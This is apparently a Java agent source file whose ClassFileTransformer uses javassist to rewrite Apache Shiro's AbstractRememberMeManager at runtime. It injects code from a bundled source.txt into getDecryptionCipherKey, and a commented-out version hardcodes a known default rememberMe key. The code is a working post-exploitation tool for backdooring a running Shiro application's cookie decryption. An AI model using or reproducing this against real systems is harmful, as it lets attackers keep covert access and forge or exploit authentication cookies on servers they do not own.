package net.shiroha.agent;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

//    @Override
//    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
//        final String shiroClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
//        final String equalName = "org/apache/shiro/mgt/AbstractRememberMeManager";
//        final String methodName = "getEncryptionCipherKey";
//        if (equalName.equals(className)) {
//            try {
//                ClassPool cp = ClassPool.getDefault();
//                if (classBeingRedefined != null) {
//                    ClassClassPath classClassPath = new ClassClassPath(classBeingRedefined);
//                    cp.insertClassPath(classClassPath);
//                }
//                CtClass cc = cp.get(shiroClassName);
//                CtMethod m = cc.getDeclaredMethod(methodName);
//                m.insertBefore("return \"4AvVhmFLUs0KTA3Kprsdag==\"");
//                byte[] byteCode = cc.toBytecode();
//                cc.detach();
//                return byteCode;
//            } catch (Exception e) {
//                e.printStackTrace();
//                System.out.println("error!");
//            }
//        }
//
//        return null;
//    }


    public String readSource() {
        StringBuffer source = new StringBuffer();
        InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line = null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while ((line = br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return source.toString();
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            URL url = new URL("file:./update.jar");
            URLClassLoader classLoader = new URLClassLoader(new URL[] {url}, Thread.currentThread().getContextClassLoader());
//            System.out.println(classLoader);

            final String shiroClassName = "org.apache.shiro.mgt.AbstractRememberMeManager";
            final String equalName = "org/apache/shiro/mgt/AbstractRememberMeManager";
            final String methodName = "getDecryptionCipherKey";
            if (equalName.equals(className)) {
                try {
                    Class<?> pool = classLoader.loadClass("javassist.ClassPool");
                    Method getDefault = pool.getDeclaredMethod("getDefault", null);
                    getDefault.setAccessible(true);
                    Object poolObject = getDefault.invoke(null, null);
                    if (classBeingRedefined != null) {
                        Class myClass = classLoader.loadClass("javassist.ClassClassPath");
                        Constructor constructor = myClass.getDeclaredConstructor(Class.class);
                        Object ccp = constructor.newInstance(classBeingRedefined);
                        System.out.println(ccp);
                        Class classPath = classLoader.loadClass("javassist.ClassPath");
                        Method insertClassPath = pool.getDeclaredMethod("insertClassPath", new Class[]{classPath});

                        insertClassPath.invoke(poolObject, new Object[]{ccp});
                        System.out.println("yesyesyes");
                    }
                    Method get = pool.getDeclaredMethod("get", new Class[] {String.class});
                    Object cc = get.invoke(poolObject, new Object[] {shiroClassName});
                    System.out.println("cc ==> " + cc);
                    Class<?> ctc = classLoader.loadClass("javassist.CtClass");
                    Method gmd = ctc.getDeclaredMethod("getDeclaredMethod", new Class[]{String.class});
                    Object m = gmd.invoke(cc, new Object[]{methodName});
                    System.out.println("m ==> " + m);
//                    Class<?> ctm = classLoader.loadClass("javassist.CtMethod");

                    // write is before insert
//                    Method defrost = ctc.getDeclaredMethod("defrost", null);
//                    defrost.setAccessible(true);
//                    defrost.invoke(cc, null);
//
//                    Method writeFile = ctc.getDeclaredMethod("writeFile", null);
//                    writeFile.setAccessible(true);
//                    writeFile.invoke(cc, null);

//                    defrost.invoke(cc, null);
                    Class<?> ctb = classLoader.loadClass("javassist.CtBehavior");
                    Method insertBefore = ctb.getDeclaredMethod("insertBefore", new Class[]{String.class});

                    String source = this.readSource();
                    System.out.println("source ==> " + source);
                    insertBefore.invoke(m, new Object[] {source});
                    Method toByteCode = ctc.getDeclaredMethod("toBytecode", null);
                    byte[] byteCode = (byte[]) toByteCode.invoke(cc, null);

//                    write failed

                    Method detach = ctc.getDeclaredMethod("detach", null);
                    detach.invoke(cc, null);

                    return byteCode;
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
